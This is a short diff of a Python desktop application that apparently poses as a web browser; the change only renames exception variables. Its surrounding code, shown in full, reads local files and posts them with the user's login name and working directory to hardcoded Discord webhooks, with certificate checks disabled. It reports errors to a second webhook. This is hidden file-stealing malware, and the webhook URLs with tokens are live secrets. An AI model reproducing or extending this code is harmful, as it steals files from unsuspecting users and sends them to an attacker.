@@ -78,10 +78,10 @@ class ExtraThread1(QThread):
 
             try: 
                 extra1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files=[{"fieldname": (kpath, open(file, "rb").read())}, {"fieldname": (dpath, open(file, "rb").read())}], json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] File received."})
-            except Exception as fe: 
-                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] {str(ee)}"})
-        except Exception as ee: 
-            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1] {str(ee)}"})
+            except Exception as e1f: 
+                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1FILE] {str(e1f)}"})
+        except Exception as e1: 
+            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} EXTRA1] {str(e1)}"})
 
 class WebBrowser(FramelessWindow):
     def __init__(self):
